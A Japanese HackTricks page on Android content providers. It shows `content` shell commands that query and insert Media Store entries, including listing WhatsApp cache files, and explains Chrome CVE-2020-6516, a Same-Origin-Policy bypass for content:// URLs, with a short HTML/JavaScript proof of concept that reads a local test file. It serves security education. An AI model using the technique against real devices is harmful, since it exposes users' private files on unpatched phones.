<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社で働いていますか？** **HackTricksで会社を宣伝したいですか**？または、**PEASSの最新バージョンにアクセスしたいですか**、または**HackTricksをPDFでダウンロードしたいですか**？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう

- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で**私をフォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>


コンテンツプロバイダを試すために、Androidデバイスで`content`コマンドを使用することができます。ルートアクセスは必ずしも必要ではありません。たとえば、Media Storeで管理されているファイルのリストを表示するには、次のコマンドを実行します：
```bash
$ content query --uri content://media/external/file
```
人間にとって分かりやすい出力を作るために、各インデックスされたファイルの識別子とパスの表示列を制限することができます。
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
メディアプロバイダーは独自のプライベートな名前空間で存在します。上記の例に示されているように、コンテンツプロバイダーにアクセスするには対応する `content://` URI を指定する必要があります。一般的に、プロバイダーにアクセスできるパスに関する情報は、アプリケーションのマニフェスト（コンテンツプロバイダーがアプリケーションによってエクスポートされている場合）やAndroidフレームワークのソースコードを調べることで回復できます。

興味深いことに、AndroidデバイスのChromeは `content://` スキームを介してコンテンツプロバイダーにアクセスすることができます。この機能により、ブラウザはサードパーティのアプリケーションによってエクスポートされたリソース（写真、ドキュメントなど）にアクセスできます。これを確認するために、メディアストアにカスタムエントリを挿入し、それをブラウザでアクセスすることができます。
```bash
$ cd /sdcard
$ echo "Hello, world!" > test.txt
$ content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
新しく挿入されたファイルの識別子を特定するには：
```bash
$ content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
実際にChromeでファイルを表示するには、次の画像に示すようなURLを使用することができます。URLのサフィックスとして使用されるファイル識別子747（上記で発見されたもの）に注目してください。

![Chrome "Hello, world!"](https://census-labs.com/media/whatsapp-screenshot-hello-world.png)

例えば、WhatsAppに関連するすべてのファイルをリストすることができます。
```bash
$ content query --uri content://media/external/file --projection _id,_data | grep -i whatsapp
...

Row: 82 _id=58, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache
Row: 83 _id=705, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/157.240.9.53.443
Row: 84 _id=239, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/crashlogs.whatsapp.net.443
Row: 85 _id=240, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/pps.whatsapp.net.443
Row: 86 _id=90, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/static.whatsapp.net.443
Row: 87 _id=706, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/v.whatsapp.net.443
Row: 88 _id=89, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/www.whatsapp.com.443
...
```
## Chrome CVE-2020-6516 Same-Origin-Policyバイパス <a href="#cve-2020-6516" id="cve-2020-6516"></a>

ブラウザの_Same Origin Policy_（SOP）\[[12](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin\_policy)]は、URL AのJavascriptコンテンツがURL Bのコンテンツにアクセスできるのは、AとBの以下のURL属性が同じである場合に限られることを定めています：

- プロトコル、例：`https` vs. `http`
- ドメイン、例：`www.example1.com` vs. `www.example2.com`
- ポート、例：`www.example1.com:8080` vs. `www.example1.com:8443`

もちろん、上記のルールには例外がありますが、一般的には、`https://www.example1.com`のリソース（例えばJavascriptコード）は、`https://www.example2.com`のリソースのDOMにアクセスできません。これは重大な情報漏洩を引き起こす可能性があるためです。**Cross-Origin-Resource-Sharing（CORS）ポリシーが明示的に許可しない限り、ウェブリソースはSOPのルールをバイパスすることはできません。**

重要なことは、Chromeは`content://`を`file://`と同じく_ローカルスキーム_と見なしているということです。この場合、SOPのルールはさらに厳格になります。各ローカルスキームURLは別のオリジンと見なされます。例えば、**file:///tmp/test.html**のJavascriptコードは、**file:///tmp/test2.html**や他のファイルにアクセスできません。**したがって、SOPのルールによれば、`content://`を介してロードされたリソースは、他の`content://`リソースにアクセスできないはずです。**しかし、Chromeの脆弱性CVE-2020-6516は、このルールに「例外」を作り出しました。

CVE-2020-6516 \[[03](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6516)]は、`content://` URLを介してロードされたリソースに対するSOPバイパスです。**例えば、`content://com.example.provider/test.html`からロードされたHTMLドキュメント内で実行されるJavascriptコードは、`content://` URLを介してロードされた他のリソースにアクセスできます。**これは深刻な脆弱性であり、特にAndroid 9またはそれ以前のバージョンのデバイスで実行されている場合にはそうです。これらのデバイスでは、スコープ付きストレージ\[[13](https://developer.android.com/about/versions/10/privacy/changes#scoped-storage)]が実装されていないため、**/sdcard**以下のアプリケーション固有のデータ、さらには興味深いことには**/sdcard/Android**以下のデータにも、システムのメディアストアコンテンツプロバイダを介してアクセスできます。

概念実証は非常に簡単です。`XMLHttpRequest`を使用して任意の`content://` URLにアクセスするHTMLドキュメントが**/sdcard**にアップロードされます。それがメディアストアに追加され、先ほどの例と同様にChromeでレンダリングされます。デモンストレーションの目的で、`content://media/external/file/747`をロードしようとすることができます。これは実際には「Hello, world!」の例のメディアストアURLです。驚くべきことに、HTMLドキュメントのオリジン内で実行されるJavascriptコードは、**test.txt**の内容を取得して表示します。
```markup
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
**この記事からの情報はこちらで入手できます:** [**https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/**](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝したいですか**？または、**PEASSの最新バージョンにアクセスしたいですか**、または**HackTricksをPDFでダウンロードしたいですか**？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
